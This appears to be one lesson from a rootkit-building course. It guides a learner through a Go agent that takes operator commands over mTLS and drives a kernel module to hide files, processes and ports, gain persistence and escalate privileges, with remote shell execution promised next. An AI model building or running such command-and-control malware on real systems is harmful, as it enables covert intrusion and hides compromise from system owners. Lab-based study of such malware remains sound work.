# L17: Command Dispatch

L16 proved the agent can drive the kernel module through mkdir.
But it only ran a hardcoded sequence.
A real agent reads commands from the operator and dispatches them.

## Protocol

The server sends one command per line.
The agent reads lines, dispatches to a handler, and writes back a response line.
Newline-delimited plaintext over mTLS.

```text
  Server (operator)              Agent (VM)
       |                            |
       |--- "PING\n" ------------->|
       |                            |  handler: write "PONG\n"
       |<-- "PONG\n" --------------|
       |                            |
       |--- "HIDE FILE secret" --->|
       |                            |  handler: mkdir("rklings.h.f.secret")
       |<-- "OK\n" ----------------|
       |                            |
       |--- "STATUS\n" ----------->|
       |                            |  handler: mkdir("rklings.status")
       |<-- "OK\n" ----------------|
       |                            |
       |--- "QUIT\n" ------------->|
       |                            |  handler: close connection
```

## Handler map

A map of command names to handler functions.
Each handler receives the argument string (everything after the first space) and the connection, and returns an error.

```go
type handler func(conn net.Conn, arg string) error

var handlers = map[string]handler{
    "PING":     handlePing,
    "STATUS":   handleStatus,
    "HIDE":     handleHide,
    "PERSIST":  handlePersist,
    "ESCALATE": handleEscalate,
}
```

The dispatch loop reads one line, splits on the first space to get the command and argument, looks up the handler, and calls it.
Unknown commands get an "ERR unknown command" response.

## Commands

| Command | Argument | mkdir | Response |
|---------|----------|-------|----------|
| PING | (none) | (none) | PONG |
| STATUS | (none) | rklings.status | OK |
| HIDE FILE name | name | rklings.h.f.name | OK |
| HIDE PID pid | pid | rklings.h.i.pid | OK |
| HIDE PORT port | port | rklings.h.p.port | OK |
| PERSIST | (none) | rklings.persist | OK |
| ESCALATE | (none) | rklings.e | OK |
| QUIT | (none) | (none) | (close) |

HIDE takes a subcommand (FILE, PID, PORT) as its first argument word.

## You write

`main.go` (~90 lines):

- mTLS dial and connection setup (from L15)
- `bufio.Scanner` read loop over the TLS connection
- Handler map with dispatch logic
- Handlers for PING, STATUS, HIDE, PERSIST, ESCALATE, QUIT

## API

```go
import "bufio"

scanner := bufio.NewScanner(conn)
for scanner.Scan() {
    line := scanner.Text()
    // split line into command + arg
}

// Write response
fmt.Fprintln(conn, "PONG")

// mkdir bridge (from L16)
os.Mkdir("rklings.h.f."+name, 0755)
```

## Test it

```
$ rklings run l17
```

The lab server opens a panel where you type commands.
The agent connects and waits for input.

```
server> PING
agent:  PONG
server> STATUS
agent:  OK
server> HIDE FILE secret.txt
agent:  OK
root@vm:~# ls    (secret.txt hidden)
server> QUIT
```

## Validate

```
$ rklings validate l17
  [+] agent connects over mTLS
  [+] PING returns PONG
  [+] STATUS triggers mkdir rklings.status
  [+] HIDE FILE x hides file from ls
  [+] ESCALATE triggers privilege escalation
  PASS
```

## Next

The agent dispatches commands.
L18 adds one more handler: EXEC, which runs shell commands and returns the output.
